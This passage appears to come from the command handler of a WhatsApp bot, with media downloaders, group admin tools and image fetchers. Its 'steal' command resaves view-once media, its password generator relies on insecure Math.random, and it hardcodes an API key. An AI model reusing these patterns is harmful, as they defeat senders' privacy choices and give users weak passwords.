await David.sendMessage(m?.chat, {react: {text: `🎉`,key: m?.key,}}) 
 reply(`*QUEEN_ANITA-V4 REPO*\n\nhttps://github.com/DeeCeeXxx/Queen_Anita-V4`)
} 
break 



         case 'languages':{
	let LANGUAGES = `
	*╭─❲ LANGUAGE CODE ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────•*`
	reply(LANGUAGES)
	}
	break
	
case 'password':
    const length = parseInt(args[0]) || 12;
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
    let password = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * charset.length);
        password += charset[randomIndex];
    }
    reply(`*Generated Password:* ${password}`);
    break;
	
        case 'mood':
    const currentHour = new Date().getHours();
    let mood = '';

    if (currentHour < 6) {
        mood = 'Sleepy 😴';
    } else if (currentHour < 12) {
        mood = 'Energetic ☀️';
    } else if (currentHour < 18) {
        mood = 'Productive 💼';
    } else {
        mood = 'Relaxed 🌙';
    }

    reply(`Your mood is: ${mood}`);
    break;



// Song Search Command
case 'song': {
    if (!text) return reply(`*Example*: ${prefix + command} Faded By Alan Walker`);
    await David.sendMessage(m?.chat, { react: { text: `🎵`, key: m?.key } });

    try {
        // Search for the song on YouTube
        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; // Take the top result

        // Build the preview message
        let body = `*QUEEN_ANITA-V4_MUSIC - PLAYER*\n` +
                   `> Title: *${video.title}*\n` +
                   `> Views: *${video.views}*\n` +
                   `> Duration: *${video.timestamp}*\n` +
                   `> Uploaded: *${video.ago}*\n` +
                   `> Url: *${video.url}*`;

        // Send the preview
        await David.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });

        // Fetch audio details using the new API
        const audioResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3`, {
            params: { url: video.url }
        });

        // Fetch video details using the new API
        const videoResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp4`, {
            params: { url: video.url }
        });

        // Check if both APIs responded successfully
        if (audioResponse.data.status && videoResponse.data.status) {
            const audioData = audioResponse.data.data;
            const videoData = videoResponse.data.data;

            // Send audio
            await David.sendMessage(m.chat, {
                audio: { url: audioData.dl },
                mimetype: 'audio/mp4',
                fileName: `${audioData.title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${audioData.title}`
            }, { quoted: m });

            // Send video
            await David.sendMessage(m.chat, {
                video: { url: videoData.dl },
                mimetype: 'video/mp4',
                caption: `\n> *Title:* ${videoData.title}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`
            }, { quoted: m });
        } else {
            reply(`*Error fetching the audio or video!*`);
        }
    } catch (error) {
        console.error('Error during song command:', error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}


// Video Download Command
case 'video': {
    if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        // React to the command with a musical note emoji
        await David.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });

        // Search for the video on YouTube
        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; // Take the top result

        // Build the preview message
        let body = `*QUEEN_ANITA-V4_VIDEO - PLAYER*\n` +
                   `> Title: *${video.title}*\n` +
                   `> Views: *${video.views}*\n` +
                   `> Duration: *${video.timestamp}*\n` +
                   `> Uploaded: *${video.ago}*\n` +
                   `> Url: *${video.url}*`;

        // Send the image and caption as a preview
        await David.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });

        // Fetch video download details using the new API (for MP4)
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp4`, {
            params: { url: video.url }
        });

        // Check if the API response is successful
        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data; // Extract title and download link

            // Send the video file directly
            await David.sendMessage(m.chat, {
                video: { url: dl },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`
            }, { quoted: m });
        } else {
            reply(`*Error fetching the video!*`);
        }
    } catch (error) {
        console.error('Error during video command:', error);
        reply(`*An error occurred while processing your request.*`);
    }
    break;
}


case 'ytmp4': {
    if (!text) return reply(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        // React to the command with a musical note emoji
        await David.sendMessage(m.chat, { react: { text: `📽️`, key: m?.key } });

        // Fetch video download details using the new API (for MP4)
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp4`, {
            params: { url: text }
        });

        // Check if the API response is successful
        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data; // Extract title and download link

            // Send the video file directly
            await David.sendMessage(m.chat, {
                video: { url: dl },
                mimetype: 'video/mp4',
                caption: `🎬 *Title:* ${title}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`
            }, { quoted: m });
        } else {
            reply(`*Error fetching the video!*`);
        }
    } catch (error) {
        console.error('Error during ytmp4 command:', error);
        reply(`*An error occurred while processing your request.*`);
    }
    break;
}

case 'ytmp3': {
    if (!text) return reply(`*Example*: ${prefix + command} https://youtube.com/watch?v=60ItHLz5WEA`);

    try {
        // React to the command with a musical note emoji
        await David.sendMessage(m.chat, { react: { text: `🎵`, key: m?.key } });

        // Fetch audio download details using the new API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3`, {
            params: { url: text }
        });

        // Check if the API response is successful
        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data; // Extract title and download link

            // Send the audio file directly
            await David.sendMessage(m.chat, {
                audio: { url: dl },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
            }, { quoted: m });
        } else {
            reply(`*Error fetching the audio!*`);
        }
    } catch (error) {
        console.error('Error during ytmp3 command:', error);
        reply(`*An error occurred while processing your request.*`);
    }
    break;
}



case 'mods': case 'modapk': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: '`David Cyril`',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*${index + 1}*. ${app.title}:\n`
      result += `∘ Download ${app.downloadUrl}\n\n`
    })

    David.sendMessage(m.chat, {
      text: result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `M O D S  S E A R C H`,
          body: `Looking for Cool and Free Apk Mods!`,
          sourceUrl: 'https://m.happymod.com',
          thumbnailUrl: 'https://imgur.com/a/PD8nT5X',
          mediaType: 2,
          renderLargerThumbnail: true
        }
      }
    })
  } else {
    reply(`Enter Text, *Like This Format*: .${command} minecraft`)
  }
}
break

case 'twitter': {
const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
  if (!text) return reply('Please give me a Twitter video link!');
//avosky
  async function avzz(link) {
    return new Promise((resolve, reject) => {
      let config = { 'URL': link };
//avosky
      axios.post('https://twdown.net/download.php', qs.stringify(config), {
        headers: {
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "sec-ch-ua": '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
          "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
          "cookie": "_ga=GA1.2.1388798541.1625064838; _gid=GA1.2.1351476739.1625064838; __gads=ID=7a60905ab10b2596-229566750eca0064:T=1625064837:RT=1625064837:S=ALNI_Mbg3GGC2b3oBVCUJt9UImup-j20Iw; _gat=1"
        }
      })
      .then(({ data }) => {
        const $ = cheerio.load(data);
        resolve({
          desc: $('div:nth-child(1) > div:nth-child(2) > p').text().trim(),
          thumb: $('div:nth-child(1) > img').attr('src'),
          video_hd: $('tbody > tr:nth-child(1) > td:nth-child(4) > a').attr('href'),
        });
      })
      .catch(reject);
    });
  }
//avosky
  try {
    await loading();
    let res = await avzz(text);
    if (res.video_hd) {
      let avox = res.desc.replace(/https:\/\/t.co\/[a-zA-Z0-9]+/gi, '').trim();
      await David.sendFile(m.chat, res.video_hd, '', avox, m);
    } else {
      reply('Error While Processing Your Request!');
    }
  } catch (e) {
    reply(`Error: ${e}`);
  }
}
break


case 'checkip':
  
  const apiUrlIpify = 'https://api.ipify.org?format=json';

  try {
    // Step 1: Get public IP from ipify
    const ipifyResponse = await axios1.get(apiUrlIpify);
    const ipAddress = ipifyResponse.data.ip;

    // Step 2: Use the IP address to get geolocation data from ip-api
    const apiUrlIpApi = `http://ip-api.com/json/${ipAddress}`;
    const ipApiResponse = await axios.get(apiUrlIpApi);
    const locationData = ipApiResponse.data;

    if (locationData.status === "fail") {
      return reply(`Error: ${locationData.message}`);
    }

    const message = `
    Public IP: ${ipAddress}\n
    Country: ${locationData.country}\n
    Region: ${locationData.regionName}\n
    City: ${locationData.city}\n
    Latitude: ${locationData.lat}\n
    Longitude: ${locationData.lon}\n
    ISP: ${locationData.isp}\n
    Timezone: ${locationData.timezone}\n
  `;

    David.sendMessage(from, { text: message }, { quoted: m });
  } catch (error) {
    console.error('Error fetching IP data:', error);
    reply('Failed to fetch IP location data. Please try again later.');
  }
  break;

 
        
case 'open': case 'steal': {
if (!m.quoted) return reply(`Reply view once message to use this command`)
let typeS = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[typeS]
var mediaaaaaaaaaa = await downloadContentFromMessage(quotedType, typeS == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (let chunk of mediaaaaaaaaaa) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await David.sendMessage(m.chat, { video: buffer, caption: quotedType.caption }, {quoted: m })
} 
else if (/image/.test(type)) {
await David.sendMessage(m.chat, { image: buffer, caption: quotedType.caption }, {quoted: m })
}
}
break;

  
  case 'setprefix': {
    if (!isCreator) return m.reply('This command is for the bot owner only.');
    if (!args[0]) return m.reply(`Example: ${prefix+command} <newprefix>`);  // Guide if no prefix is provided

    // Set the new prefix
    global.prefix = args[0];  // Update the global prefix dynamically
    m.reply(`Prefix has been successfully set to: ${global.prefix}`);
    break;
}

case 'kickall': {
if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
const users = participants.map(a => a.id)
await David.groupParticipantsUpdate(m.chat, [users], 'remove')
await reply(`Done`)
}
break
          
          
          
          case 'wanted': {
    // Ensure the command is a reply to an image
    if (!/image/.test(mime)) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .wanted to create a wanted poster*`);
    }

    // Check if there is a quoted message (the image)
    if (!quoted) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image with .wanted to create a wanted poster*`);
    }

    try {
        // React to show that processing has started
        await David.sendMessage(m?.chat, { react: { text: `⏳`, key: m?.key } });

        // Download the image locally
        const mediaPath = await David.downloadAndSaveMediaMessage(quoted);

        // Upload the image to Imgur
        const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
        if (uploadResponse.status !== "success") {
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
            return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
        }

        const imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL

        // Call the "wanted" API with the uploaded image URL
        const apiResponse = await axios.get(`https://api.popcat.xyz/wanted`, {
            params: { image: imageUrl }
        });

        // Check the API response
        if (apiResponse.status === 200) {
            const wantedImageUrl = apiResponse.request.res.responseUrl; // The URL of the wanted poster

            // Send the wanted poster back to the user
            await David.sendMessage(m?.chat, {
                image: { url: wantedImageUrl },
                caption: `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`
            }, { quoted: m });
        } else {
            reply(`*WANTED POSTER ERROR!! MESSAGE :*\n\n> Failed to create a wanted poster. Try again.`);
        }

        // Clean up: Delete the downloaded file
        fs.unlinkSync(mediaPath);

    } catch (error) {
        console.error('Error in Wanted command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    // React to indicate success
    await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
    break;
}


	
      case 'promote': case 'admin': {
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
        David.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "promoted successfully")
        await David.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'demote': case 'unadmin': {
      
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isAdmins && !isCreator) return reply('')
        David.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "demoted successfully")
        await David.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'add': {
        if (!m.isGroup) return reply('For Groups Only');
        if (!isBotAdmins) return reply('Bot Must Be Admin');
        if (!isCreator) return reply('For My Owner Only')
        David.sendMessage(from, { react: { text: "🫡", key: m.key } })


        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        if (users.length == 0) return reply(`Please write the number of the person you want to add to thhis group`)
        await David.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(`User Added Successfully!`)).catch((err) => reply(`Cannot add that user to this group!`))
      }
        break;  
        
const dailyTasks = [
    "Take a 5-minute walk.",
    "Drink 2 liters of water.",
    "Spend 10 minutes meditating.",
    "Read 10 pages of a book.",
    "Complete a short workout.",
    "Organize your workspace.",
    "Write down three things you’re grateful for."
];

case 'dailytasks':
    const shuffledTasks = dailyTasks.sort(() => 0.5 - Math.random()).slice(0, 3);  // Pick 3 random tasks
    let taskMessage = '📝 Here are your tasks for today:\n\n';
    shuffledTasks.forEach((task, index) => taskMessage += `${index + 1}. ${task}\n`);
    reply(taskMessage);
    break;
 
case 'removebg':
  if (!quoted) return m.reply(`*Example :*\n> *Reply A Photo With Caption .removebg*`)
  if (!/image/.test(mime)) return reply(`*Example :*\n> *Reply A Photo With Caption .removebg*`)
  if (/image/.test(mime)) {
reply('`Processing`') 
  let mee = await David.downloadAndSaveMediaMessage(quoted)
  let mem = await shannzCdn(mee)
  let url = mem.result.url;
  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=gojou&url=${url}`)).json()
  let bg = shannz.result.image
  David.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break




case 'opengroup': 
case 'buka': {
if (!m.isGroup) return (`For Group Only`) 
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`) 
David.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Done`)
}
break

case 'close': 
case 'closegroup': {
if (!m.isGroup) return (`For Group Only`) 
if (!isAdmins) return (`For Admins Only`)
if (!isBotAdmins) return (`Bot Must Be Admin`) 
David.groupSettingUpdate(m.chat, 'announcement')
reply(`Done`)
}
break    
     
            

  
  


 case 'xnxxdl':{
 

if (!text) return reply(`Where Is the link?\nExample: *.xnxxvideo https://www.xnxx.com/xxxxxxxxxxx*`) 
  reply('`Downloading...`')
  
  try {
    let res = await fetch(`https://api.agatz.xyz/api/xnxxdown?url=${encodeURIComponent(text)}`)
    let json = await res.json()
    
    if (json.status !== 200 || !json.data.status) return reply('Failed to fetch data from API') 

    let videoUrl = json.data.files.high || json.data.files.low || json.data.files.HLS
    let caption = `Title: ${json.data.title}\nDuration: ${json.data.duration}\nInfo: ${json.data.info}`
    let thumbnailUrl = json.data.image

    await David.sendMessage(m.chat, { 
      video: { url: videoUrl }, 
      caption: caption 
    }, { quoted: m })
    
  } catch (e) {
    reply(`An Error Occurred, Unable to Retrieve Data From the Url/Link You Entered`)
  }
}
break  

case 'autobio': {
    if (!isCreator) return m.reply('For My Owner Only');

    if (!args[0]) return m.reply(`Example: ${prefix + command} on <city or country>`);

    if (args[0] === 'on') {
        if (!args[1]) return m.reply(`Please provide your city or country\n\n Example ${prefix + command} on Africa/Lagos`);

        const location = args.slice(1).join(" ");

        // Find the timezone based on the location input
        const timeZone = moment.tz.zone(location);
        if (!timeZone) {
            return m.reply('Invalid location. Please provide a valid city or country.');
        }

        global.autobio = true;
        await m.reply(`Autobio Activated. Using timezone for: ${location}`);
        
        setAutobio(David, timeZone.name);  // Automatically set the timezone
    } else if (args[0] === 'off') {
        global.autobio = false;
        if (intervalId) clearInterval(intervalId);
        await m.reply('Autobio Deactivated.');
    } else {
        await m.reply(`Invalid option. Example: ${prefix + command} on/off`);
    }
}
break;






case 'amazon':
  if (!text) return reply('Enter the product you want to search for')
  let p = await (await fetch('https://endpoint.web.id/search/amazon?key=gojou&query=' + text)).json()
  let u = p.result
  let firstImageUrl = u[0].imageUrl
  let caption = u.map(item => 
    `Rating: ${item.rating}\n` +
    `Title: ${item.title}\n` +
    `Price: $${item.price}\n` +
    `Product URL: ${item.productUrl}`
  ).join('\n\n')
  David.sendMessage(m.chat, { image: { url: firstImageUrl }, caption: caption }, { quoted: m })
break



case 'xnxx': case 'xnxxsearch': {
 if (!isCreator) return reply(`For My Owner Only`) 
 if (m.isGroup) return warning("For Private Chat only")
 if (!text) return reply (`*Example :* ${command} stepmoms`)
 reply('`searching...`')
  let response = await fetch(`https://api.agatz.xyz/api/xnxx?message=${text}`)
  let res = await response.json()

  if (res.status !== 200) throw `API Error: ${res.creator}`

  let resultText = ''
  for (let i = 0; i < res.data.result.length; i++) {
    let result = res.data.result[i]
    let hasil = `• Title: *${result.title}*\n• Info: *${result.info}*\n• Link: *${result.link}*\n`
    resultText += hasil + '\n'
  }
reply(resultText)
}
break 



case 'facebook': case 'fb': case 'fbdl': case 'fbdownload': {
    if (!text) {
        return reply(`*please give me a facebook url or video link*`);
    }

    try {
        // Notify the user the bot is processing the request
        await David.sendMessage(m.chat, { react: { text: `⏳`, key: m?.key } });

        // Fetch video data from the API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/facebook`, {
            params: { url: text }
        });

        const { status, data } = apiResponse.data;

        if (status && data && data.video) {
            const videoLink = data.video;
            const videoTitle = data.userInfo?.name || "Facebook Video";
            const thumbnail = data.thumbnail;

           await David.sendMessage(m?.chat, {react: {text: `📥`,key: m?.key,}});

            // Send the video as a normal video
            await David.sendMessage(m.chat, {
                video: { url: videoLink },
                mimetype: 'video/mp4',
                caption: `\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
            }, { quoted: m });
            await David.sendMessage(m.chat, { react: { text: `✅`, key: m?.key } });
        } else {
            reply(`*❌ Failed to download the video. Please check the link and try again.*`);
        }
    } catch (error) {
        console.error("Error in Facebook Downloader:", error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}

case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': case 'igdownload': case 'instadl': case 'instagramdl': case 'instagram': case 'igdl': {
    if (!text || !text.startsWith('http')) {
        return reply(`*Usage:* .igdl <Instagram URL>\n\n*Example:* .igdl https://www.instagram.com/p/CyIqjWusPec/`);
    }

    try {
        // Call the Instagram downloader API
        const apiResponse = await axios.get(`https://bk9.fun/download/instagram2`, {
            params: { url: text },
        });

        // Check API response
        if (apiResponse.status === 200 && apiResponse.data.status) {
            const mediaList = apiResponse.data.BK9;

            if (mediaList.length === 0) {
                return reply(`No media found at the provided Instagram URL.`);
            }

            // Send each media item as video
            for (const media of mediaList) {
                await David.sendMessage(
                    m.chat,
                    {
                        video: { url: media.url }, // Send as a video
                        caption: `*Instagram Downloader*\n\n🔗 URL: ${text}`,
                    },
                    { quoted: m }
                );
            }
        } else {
            reply(`\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`);
        }
    } catch (error) {
        console.error('Error in Instagram Downloader command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}



  case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                await await loading()
                let media = await David.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    David.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
        
            
         

  
    
            
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await loading()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
